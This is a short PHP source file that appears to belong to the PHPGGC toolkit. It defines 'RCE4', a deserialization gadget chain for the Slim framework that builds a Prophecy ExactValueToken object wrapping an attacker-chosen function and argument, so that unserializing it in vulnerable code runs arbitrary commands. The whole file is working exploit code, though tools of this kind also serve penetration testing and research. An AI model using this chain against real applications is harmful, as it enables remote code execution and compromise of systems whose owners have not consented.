<?php

namespace GadgetChain\Slim;

class RCE4 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.11.0';
    public static $vector = '__toString';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Prophecy\Argument\Token\ExactValueToken($function, $parameter);
    }
}